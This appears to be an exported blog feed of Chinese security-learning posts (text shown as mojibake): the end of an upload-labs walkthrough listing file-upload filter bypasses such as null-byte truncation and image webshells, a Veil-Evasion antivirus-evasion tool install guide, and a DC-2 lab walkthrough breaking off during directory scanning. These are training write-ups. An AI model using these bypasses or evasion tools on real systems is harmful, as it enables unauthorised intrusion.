<h2 id="Pass09-é»‘åå•-ç‚¹ç©ºç‚¹ç»•è¿‡"><a href="#Pass09-é»‘åå•-ç‚¹ç©ºç‚¹ç»•è¿‡" class="headerlink" title="Pass09.é»‘åå• ç‚¹ç©ºç‚¹ç»•è¿‡"></a>Pass09.é»‘åå• ç‚¹ç©ºç‚¹ç»•è¿‡</h2><p><code>ä¼šåˆ é™¤æ–‡ä»¶åçš„ç‚¹ï¼Œåœ¨æ–‡ä»¶åæ·»åŠ . .è¿›è¡Œç»•è¿‡(windowç¯å¢ƒ)</code></p>
<h2 id="Pass10-é»‘åå•-åŒå†™åç¼€ç»•è¿‡"><a href="#Pass10-é»‘åå•-åŒå†™åç¼€ç»•è¿‡" class="headerlink" title="Pass10.é»‘åå• åŒå†™åç¼€ç»•è¿‡"></a>Pass10.é»‘åå• åŒå†™åç¼€ç»•è¿‡</h2><p><code>ä»å‰åŒ¹é…phpè¿›è¡Œåˆ é™¤ï¼ŒåŒå†™ç»•è¿‡</code></p>
<h2 id="Pass11-ç™½åå•-00ç»•è¿‡"><a href="#Pass11-ç™½åå•-00ç»•è¿‡" class="headerlink" title="Pass11.ç™½åå• %00ç»•è¿‡"></a>Pass11.ç™½åå• %00ç»•è¿‡</h2><p><code>getä¼ å‚è·¯å¾„å¯æ§</code></p>
<img src="/2021/05/03/upload-labs/image-20210501173709601.png" class>

<p><code>PHPç‰ˆæœ¬å°äº5.3.4 å…³é—­GPC</code></p>
<img src="/2021/05/03/upload-labs/image-20210501180802917.png" class>

<h2 id="Pass12-ç™½åå•-0x00ç»•è¿‡"><a href="#Pass12-ç™½åå•-0x00ç»•è¿‡" class="headerlink" title="Pass12.ç™½åå• 0x00ç»•è¿‡"></a>Pass12.ç™½åå• 0x00ç»•è¿‡</h2><blockquote>
<p>shell_get.php%00</p>
</blockquote>
<p><code>åŒä¸Šï¼Œç”±äºpostä¼ å‚æ‰€ä»¥å°†%00è¿›è¡Œurlç¼–ç </code></p>
<img src="/2021/05/03/upload-labs/image-20210501182130172.png" class>

<h2 id="Pass13-æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass13-æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass13.æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass13.æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ å›¾ç‰‡é©¬ç»•è¿‡</h2><img src="/2021/05/03/upload-labs/image-20210501184645711.png" class>

<h2 id="Pass14-getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass14-getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass14.getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass14.getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡</h2><p><code>åŒä¸Š</code></p>
<h2 id="Pass15-exif-imagetype-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass15-exif-imagetype-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass15.exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass15.exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡</h2><p><code>åŒä¸Š</code></p>
<h2 id="Pass16-å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#Pass16-å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass16.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"></a>Pass16.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</h2><p><code>å°†äºŒæ¬¡æ¸²æŸ“åæ–‡ä»¶æœªå˜åŒ–çš„éƒ¨åˆ†æ·»åŠ ä¸€å¥è¯ï¼Œå†æ¬¡ä¸Šä¼ ï¼Œå†åŒ…å«ï¼Œèšå‰‘è¿æ¥ã€‚æœ¬æ¡ˆä¾‹ä½¿ç”¨gifï¼Œå›¾ç‰‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸Šä¼ ä¸ä¸Šå»ã€‚</code> </p>
<img src="/2021/05/03/upload-labs/image-20210503180938026.png" class>

<h2 id="Pass17-æ¡ä»¶ç«äº‰"><a href="#Pass17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass17.æ¡ä»¶ç«äº‰"></a>Pass17.æ¡ä»¶ç«äº‰</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL3BlbmV0cmF0aW9uLXRlc3QvdXBsb2FkLWxhYnMtcGFzcy0xNy5odG1s">å¤§ä½¬çš„æ–‡ç« <i class="fa fa-external-link-alt"></i></span></p>
<p><code>å…ˆmoveå†åˆ¤æ–­ï¼Œç¬¦åˆç™½åå•å°±é‡å‘½åï¼Œä¸ç¬¦åˆå°±unlinkã€‚</code></p>
<p><code>ä½†æ˜¯æˆ‘å›¾ç‰‡é©¬ç›´æ¥å°±å¯ä»¥äº†ï¼Œä¸ºäº†å­¦ä¹ æ–°çŸ¥è¯†ï¼Œä¹Ÿç”¨å¤§ä½¬çš„æ–¹æ³•åšäº†ä¸€é</code></p>
<h2 id="Pass18-æ¡ä»¶ç«äº‰"><a href="#Pass18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass18.æ¡ä»¶ç«äº‰"></a>Pass18.æ¡ä»¶ç«äº‰</h2><p><code>ä¸pass17ç±»ä¼¼</code></p>
<h2 id="Pass19-ç»•è¿‡"><a href="#Pass19-ç»•è¿‡" class="headerlink" title="Pass19./.ç»•è¿‡"></a>Pass19./.ç»•è¿‡</h2><p><code>move_uploaded_fileä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.</code></p>
<img src="/2021/05/03/upload-labs/image-20210503190859889.png" class>

<img src="/2021/05/03/upload-labs/image-20210503191007583.png" class>

<h2 id="Pass20-ä»£ç å®¡è®¡-æ•°ç»„ç»•è¿‡"><a href="#Pass20-ä»£ç å®¡è®¡-æ•°ç»„ç»•è¿‡" class="headerlink" title="Pass20.ä»£ç å®¡è®¡ æ•°ç»„ç»•è¿‡"></a>Pass20.ä»£ç å®¡è®¡ æ•°ç»„ç»•è¿‡</h2><p><code>ç›´æ¥å‚è€ƒå¤§ä½¬çš„æ–‡ç« </code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwMjk3OTUvYXJ0aWNsZS9kZXRhaWxzLzEwMjkxNzE5OQ==">åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Webé¶åœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Veil-Evasionå®‰è£…</title>
    <url>/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Veil-Evasionç®€ä»‹"><a href="#Veil-Evasionç®€ä»‹" class="headerlink" title="Veil-Evasionç®€ä»‹"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>ç®€ä»‹</h2><blockquote>
<p>Veil-Evasionæ˜¯ä¸€ç§å…æ€å·¥å…·ï¼Œç”¨äºç”Ÿæˆç»•è¿‡å¸¸è§AVçš„metasploit payloadã€‚</p>
<p>Veil-Evasionè¢«åŸç”Ÿè®¾è®¡åœ¨kaliä¸Šï¼Œ,ä½†kali2020å·²ç»éœ€è¦ç‹¬ç«‹å®‰è£…ã€‚å…¶å®å­˜åœ¨pythonç¯å¢ƒçš„ç³»ç»Ÿä¸Šåº”è¯¥éƒ½èƒ½è¿è¡Œã€‚ä½ å¯ä»¥ç”¨å‘½ä»¤è¡Œè½»æ¾è°ƒç”¨Veil-Evasionï¼ŒæŒ‰èœå•é€‰é¡¹ç”Ÿæˆpayloadã€‚åœ¨åˆ›å»ºpayloadçš„æ—¶å€™ï¼ŒVeil-Evasionä¼šè¯¢é—®ä½ æ˜¯å¦æƒ³æŠŠ<strong>payloadæ–‡ä»¶ç”¨Pyinstalleræˆ–è€…Py2Exeè½¬ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚</strong></p>
</blockquote>
<p><strong>å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼</strong></p>
<a id="more"></a>

<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><h3 id="é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020-3"><a href="#é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020-3" class="headerlink" title="é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020.3"></a>é¦–å…ˆæ›´æ–°ç³»ç»Ÿï¼Œæœ¬æ¬¡ç³»ç»Ÿä¸º2020.3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update        //æ›´æ–°æ‰€æœ‰è½¯ä»¶åŒ…çš„åˆ—è¡¨</span><br><span class="line">apt-get upgrade        //æ›´æ–°æ‰€æœ‰è½¯ä»¶</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…"><a href="#æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…"></a>æŸ¥çœ‹ç³»ç»Ÿè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚"><a href="#é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚" class="headerlink" title="é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚"></a>é…ç½®cloneåŠ é€Ÿï¼Œéœ€è¦é…ç½®ä»£ç†ã€‚</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…veil"><a href="#å®‰è£…veil" class="headerlink" title="å®‰è£…veil"></a>å®‰è£…veil</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure>

<p><code>ç”±äºéœ€è¦è¿è¡Œwindowsä¸‹çš„ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦å®‰è£…windowsç³»ç»Ÿä¸‹çš„ç¨‹åº</code></p>
<p><strong><code>é»˜è®¤å®‰è£…å³å¯</code></strong></p>
<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class>

<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class>

<p><strong><code>å…¶ä»–å®‰è£…ç•¥</code></strong></p>
<h3 id="å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ"><a href="#å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ" class="headerlink" title="å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ"></a><strong>å®‰è£…å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼ˆæˆ‘çš„é”™è¯¯å¦‚ä¸‹ï¼‰ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ</strong></h3><blockquote>
<p><strong>é”™è¯¯å¦‚ä¸‹ï¼ŒæŒ‰æç¤ºæ‰§è¡Œå‘½ä»¤å³å¯</strong></p>
<p>[I] If you have any errors running Veil, run: <strong>â€˜./Veil.py â€“setupâ€™</strong> and select the nuke the wine folder option</p>
<p>[I] Done!</p>
<p>[!] ERROR #2-3: Canâ€™t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh â€“force â€“silent</strong></p>
<p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class>

<h2 id="æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»"><a href="#æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»" class="headerlink" title="æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»"></a>æ—¥åå†å†™ä½¿ç”¨æ–¹å¼ã€‚ã€‚ã€‚ä½›ç³»ä½›ç³»</h2>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security tools</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2</title>
    <url>/2020/08/21/DC-2/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
<p>As with the original DC-1, itâ€™s designed with beginners in mind.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>Just like with DC-1, there are five flags including the final flag.</p>
<p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p>
<p>In short, the only flag that really counts, is the final flag.</p>
<p>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.</p>
<p>I havenâ€™t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-ä¸Šnmap"><a href="#0x01-ä¸Šnmap" class="headerlink" title="0x01.ä¸Šnmap"></a>0x01.ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ4å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 21:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:0C:29:83:64:3E (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†80/7744ç«¯å£ï¼Œå¹¶ä¸”7744ä¸ºssh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># nmap -A 192.168.1.4 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:05 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:83:64:3E (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.48 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.20 seconds</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>å‘ç°é‡å®šå‘åˆ°äº†dc-/ä¸”æ— æ³•è§£æ</code></p>
<img src="/2020/08/21/DC-2/image-20200821101342609.png" class>

<h2 id="0x04-ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè¿›è¡Œæœ¬åœ°è§£æ"><a href="#0x04-ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè¿›è¡Œæœ¬åœ°è§£æ" class="headerlink" title="0x04.ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè¿›è¡Œæœ¬åœ°è§£æ"></a>0x04.ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè¿›è¡Œæœ¬åœ°è§£æ</h2><h3 id="1-æ·»åŠ ä¸€è¡Œ"><a href="#1-æ·»åŠ ä¸€è¡Œ" class="headerlink" title="1.æ·»åŠ ä¸€è¡Œ"></a>1.æ·»åŠ ä¸€è¡Œ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.4        dc-2</span><br></pre></td></tr></table></figure>

<h3 id="2-å†æ¬¡è®¿é—®"><a href="#2-å†æ¬¡è®¿é—®" class="headerlink" title="2.å†æ¬¡è®¿é—®"></a>2.å†æ¬¡è®¿é—®</h3><img src="/2020/08/21/DC-2/image-20200821101740236.png" class>

<h3 id="3-å‘ç°ç½‘ç«™cmsæ˜¯wordpressï¼Œå¹¶ä¸”ä¹Ÿå¾—åˆ°äº†flag1ä¸å…¶ä»–æç¤º"><a href="#3-å‘ç°ç½‘ç«™cmsæ˜¯wordpressï¼Œå¹¶ä¸”ä¹Ÿå¾—åˆ°äº†flag1ä¸å…¶ä»–æç¤º" class="headerlink" title="3.å‘ç°ç½‘ç«™cmsæ˜¯wordpressï¼Œå¹¶ä¸”ä¹Ÿå¾—åˆ°äº†flag1ä¸å…¶ä»–æç¤º"></a>3.å‘ç°ç½‘ç«™cmsæ˜¯wordpressï¼Œå¹¶ä¸”ä¹Ÿå¾—åˆ°äº†flag1ä¸å…¶ä»–æç¤º</h3><img src="/2020/08/21/DC-2/image-20200821102232934.png" class>

<h2 id="0x5-è¿›è¡Œcewl"><a href="#0x5-è¿›è¡Œcewl" class="headerlink" title="0x5.è¿›è¡Œcewl"></a>0x5.è¿›è¡Œcewl</h2><p><code>cewlæ ¹æ®æŒ‡å®šurlçˆ¬è¡Œï¼Œç”Ÿæˆå®šåˆ¶åŒ–çš„å¯†ç å­—å…¸</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># cewl dc-2 &gt; pwd.dict</span></span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wc -l pwd.dict </span></span><br><span class="line">239 pwd.dict</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-æ‰«æç›®å½•"><a href="#0x06-æ‰«æç›®å½•" class="headerlink" title="0x06.æ‰«æç›®å½•"></a>0x06.æ‰«æç›®å½•</h2><p><code>ç”±äºæ˜¯ä¸€ä¸ªweb applicationï¼Œæ‰€ä»¥è¿›è¡Œä¸€ä¸‹ç›®å½•æ‰«æï¼Œæœ¬æ¬¡ä½¿ç”¨msfï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dirbï¼Œgobuster</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        yes       The path  to identify files</span><br><span class="line">   Proxies                                                              no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT       80                                                       yes       The target port (TCP)</span><br><span class="line">   SSL         <span class="literal">false</span>                                                    no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     1                                                        yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                                                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="built_in">set</span> rhosts 192.168.1.4</span><br><span class="line">rhosts =&gt; 192.168.1.4</span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="built_in">set</span> threads 50</span><br><span class="line">threads =&gt; 50</span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Detecting error code</span><br><span class="line">[*] Using code <span class="string">&#x27;404&#x27;</span> as not found <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">[+] Found http://192.168.1.4:80/icons/ 404 (192.168.1.4)</span><br><span class="line">[+] Found http://192.168.1.4:80/wp-includes/ 404 (192.168.1.4)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥å‘ç°wp-includesç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°æ–‡ä»¶ç›®å½•ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œè¿˜å¾—dirb</code></p>
<img src="/2020/08/21/DC-2/image-20200821105032116.png" class>

<p><code>dirbæ‰«æå‘ç°wp-adminï¼Œå°è¯•æ‰“å¼€</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># dirb http://dc-2</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Aug 21 01:08:03 2020</span><br><span class="line">URL_BASE: http://dc-2/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://dc-2/ ----</span><br><span class="line">+ http://dc-2/index.php (CODE:301|SIZE:0)                                         </span><br><span class="line">+ http://dc-2/server-status (CODE:403|SIZE:292)                                     </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/                                              </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-includes/                                             </span><br><span class="line">+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)                                         </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/ ----</span><br><span class="line">+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)                                   </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/css/                                             </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/images/                                         </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/includes/                                       </span><br><span class="line">+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)                                   </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/js/                                             </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/maint/                                           </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/network/                                         </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/user/                                           </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/ ----</span><br><span class="line">+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)                                 </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/languages/                                     </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/plugins/                         